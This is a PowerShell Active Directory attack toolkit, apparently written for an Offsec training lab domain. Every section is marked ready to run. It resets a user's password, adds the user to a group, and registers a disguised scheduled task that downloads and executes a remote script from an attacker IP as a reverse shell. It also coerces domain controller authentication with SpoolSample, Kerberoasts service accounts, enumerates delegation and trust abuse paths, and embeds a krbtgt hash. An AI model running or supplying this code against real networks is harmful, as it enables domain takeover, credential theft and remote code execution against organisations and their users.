# Offsec-AD-Abuse-Toolkit-FULL-CORRECTED.ps1
# Fixed property names (no dashes in dot-notation)
# All sections active — run as-is in elevated PowerShell with PowerView loaded

# Optional parameters (customize as needed)
$AttackIP       = "192.168.45.200"      # your listener IP
$RevPort        = "4444"
$DC             = "cdc01.prod.corp1.com"
$DelegatedHost  = "appsrv01.prod.corp1.com"
$TargetUser     = "testservice1"
$TargetGroup    = "TestGroup"
$NewPassword    = "h4x"
$KrbtgtHash     = "cce9d6cd94eb31ccfbb7cc8eeadf7ce1"   # REPLACE after DCSync!

Clear-Host
Write-Host "Offsec AD Abuse Toolkit - FULL & CORRECTED" -ForegroundColor Cyan
Write-Host "User: $env:USERDOMAIN\$env:USERNAME   |   $(Get-Date -Format 'yyyy-MM-dd HH:mm')" -ForegroundColor Gray
Write-Host ""

# Make sure PowerView is loaded
if (-not (Get-Command Get-DomainUser -ErrorAction SilentlyContinue)) {
    Write-Host "PowerView not detected. Trying to import..." -ForegroundColor Yellow
    try { Import-Module .\PowerView.ps1 -ErrorAction Stop }
    catch { Write-Host "Failed to load PowerView. Run Import-Module .\PowerView.ps1 first." -ForegroundColor Red; exit }
}

$me = "$env:USERDOMAIN\$env:USERNAME"

# ──────────────────────────────────────────────────────────────────────────────
# 1. Dangerous ACLs on Users
# ──────────────────────────────────────────────────────────────────────────────
Write-Host "[1] Users with dangerous rights (GenericAll / WriteDacl / etc.)" -ForegroundColor Green
Get-DomainUser | Get-ObjectAcl -ResolveGUIDs |
    Where-Object { 
        $_.IdentityReference -eq $me -and 
        $_.ActiveDirectoryRights -match "GenericAll|WriteDacl|GenericWrite|ForceChangePassword"
    } | 
    Select-Object ObjectDN, ActiveDirectoryRights, ObjectAceType, IsInherited |
    Format-Table -AutoSize

# ──────────────────────────────────────────────────────────────────────────────
# 2. Dangerous ACLs on Groups
# ──────────────────────────────────────────────────────────────────────────────
Write-Host "[2] Groups with GenericAll / WriteMembers" -ForegroundColor Green
Get-DomainGroup | Get-ObjectAcl -ResolveGUIDs |
    Where-Object { 
        $_.IdentityReference -eq $me -and 
        $_.ActiveDirectoryRights -match "GenericAll|WriteMembers"
    } | 
    Select-Object ObjectDN, ActiveDirectoryRights, ObjectAceType, IsInherited |
    Format-Table -AutoSize

# ──────────────────────────────────────────────────────────────────────────────
# 3. Add self to group
# ──────────────────────────────────────────────────────────────────────────────
Write-Host "[3] Adding $env:USERNAME → $TargetGroup" -ForegroundColor Green
net group "$TargetGroup" $env:USERNAME /add /domain

# ──────────────────────────────────────────────────────────────────────────────
# 4. Reset password
# ──────────────────────────────────────────────────────────────────────────────
Write-Host "[4] Resetting $TargetUser password to $NewPassword" -ForegroundColor Green
net user $TargetUser $NewPassword /domain

# ──────────────────────────────────────────────────────────────────────────────
# 5. Scheduled Task reverse shell
# ──────────────────────────────────────────────────────────────────────────────
Write-Host "[5] Creating scheduled task reverse shell as $TargetUser" -ForegroundColor Green
$action   = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-nop -w hidden -c IEX((New-Object Net.WebClient).DownloadString('http://$AttackIP/shell.ps1'))"
$trigger  = New-ScheduledTaskTrigger -Once -At (Get-Date).AddSeconds(30)
$principal = New-ScheduledTaskPrincipal -UserId "PROD\$TargetUser" -LogonType Password -RunLevel Highest
Register-ScheduledTask -TaskName "UpdateCheck" -Action $action -Trigger $trigger -Principal $principal -Force
Write-Host "Task created. Catch on $AttackIP`:$RevPort" -ForegroundColor Yellow

# ──────────────────────────────────────────────────────────────────────────────
# 6. Unconstrained Delegation coercion
# ──────────────────────────────────────────────────────────────────────────────
Write-Host "[6] Unconstrained Delegation - Coercing $DC auth" -ForegroundColor Green
Write-Host "Run in another window: Rubeus.exe monitor /interval:5 /filteruser:$($DC.Split('.')[0])$"
Start-Sleep -Seconds 2
Write-Host "Running SpoolSample now..."
C:\Tools\SpoolSample.exe $DC $env:COMPUTERNAME

# ──────────────────────────────────────────────────────────────────────────────
# 7. Kerberoasting
# ──────────────────────────────────────────────────────────────────────────────
Write-Host "[7] Kerberoasting - Requesting TGS for SPN accounts" -ForegroundColor Green
Get-DomainUser -SPN -Properties samaccountname,serviceprincipalname,pwdlastset |
    Where-Object { $_.samaccountname -notlike "*$" } |
    ForEach-Object {
        Write-Host " → $($_.samaccountname)  $($_.serviceprincipalname)"
        try {
            Add-Type -AssemblyName System.IdentityModel
            New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.serviceprincipalname | Out-Null
        } catch {}
    }
Write-Host "Done. Use Rubeus harvest or export tickets for cracking." -ForegroundColor Yellow

# ──────────────────────────────────────────────────────────────────────────────
# 8. Constrained Delegation
# ──────────────────────────────────────────────────────────────────────────────
Write-Host "[8] Constrained Delegation - AllowedToDelegateTo" -ForegroundColor Green
Get-DomainUser -TrustedToAuth -Properties samaccountname,msdsallowedtodelegateto |
    Where-Object { $_.msdsallowedtodelegateto } |
    Select-Object samaccountname, 
        @{Name="AllowedToDelegateTo";Expression={ $_.msdsallowedtodelegateto -join ", " }} |
    Format-Table -AutoSize

# ──────────────────────────────────────────────────────────────────────────────
# 9. Resource-Based Constrained Delegation (RBCD)
# ──────────────────────────────────────────────────────────────────────────────
Write-Host "[9] RBCD - Computers with AllowedToActOnBehalfOfOtherIdentity" -ForegroundColor Green
Get-DomainComputer -Properties samaccountname,msdsallowedtoactonbehalfofotheridentity |
    Where-Object { $_.msdsallowedtoactonbehalfofotheridentity } |
    Select-Object samaccountname, 
        @{Name="AllowedPrincipals";Expression={ $_.msdsallowedtoactonbehalfofotheridentity -join ", " }} |
    Format-Table -AutoSize

Write-Host "`nComputers you can modify for RBCD (GenericAll/GenericWrite):" -ForegroundColor Green
Get-DomainComputer | Get-ObjectAcl -ResolveGUIDs |
    Where-Object { 
        $_.IdentityReference -eq $me -and 
        $_.ActiveDirectoryRights -match "GenericAll|GenericWrite"
    } | 
    Select-Object ObjectDN, ActiveDirectoryRights, IsInherited |
    Format-Table -AutoSize

# ──────────────────────────────────────────────────────────────────────────────
# 10. Forest / Trust Enumeration
# ──────────────────────────────────────────────────────────────────────────────
Write-Host "[10] Forest & Trust Enumeration" -ForegroundColor Green

Write-Host "`n.NET trusts:" -ForegroundColor DarkCyan
([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).GetAllTrustRelationships() | Format-Table -AutoSize

Write-Host "`nWin32 API trusts:" -ForegroundColor DarkCyan
Get-DomainTrust -API | Format-Table SourceName, TargetName, Flags, TrustType -AutoSize

Write-Host "`nLDAP trusts:" -ForegroundColor DarkCyan
Get-DomainTrust | Format-Table SourceName, TargetName, TrustDirection -AutoSize

Write-Host "`nEnterprise Admins (corp1.com):" -ForegroundColor DarkCyan
Get-DomainGroupMember -Identity "Enterprise Admins" -Domain corp1.com -Recurse | 
    Select-Object MemberName, MemberDomain | Format-Table -AutoSize

Write-Host "`nFinished." -ForegroundColor Cyan
